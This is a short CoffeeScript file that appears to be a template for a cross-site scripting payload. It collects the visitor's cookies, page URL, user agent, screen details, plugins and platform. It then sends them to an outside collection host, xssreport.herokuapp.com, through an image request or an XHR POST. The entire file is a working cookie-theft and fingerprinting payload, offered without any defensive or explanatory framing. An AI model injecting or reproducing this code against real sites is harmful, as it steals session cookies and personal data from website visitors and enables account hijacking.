# cookie
d = 'c=' + encodeURIComponent(document.cookie)
# url
d += '&u=' + encodeURIComponent(window.location.href)
# useragent 
d += '&ua=' + encodeURIComponent(navigator.userAgent)
# screen
s = ''
for k, v of screen
  s += k + ':' + v + ';'
d += '&s=' + encodeURIComponent(s)
# plugins, platform
a = 'Plugins:'
for p in navigator.plugins
  a += (p.name || '') + ', '
a += '; Platform:' + navigator.platform + ';'
d += '&a=' + encodeURIComponent(a)

getURL = ->
  (if 'https:' == document.location.protocol then 'https://' else 'http://') + "xssreport.herokuapp.com/r/<%= uri %>/"

if d.length < 1800
  i = new Image()
  i.src = getURL() + "?" + d
else
  xmlhttp = if window.XMLHttpRequest then new XMLHttpRequest() else new ActiveXObject("Microsoft.XMLHTTP")
  xmlhttp.open("POST", getURL(), true)
  xmlhttp.send(d)
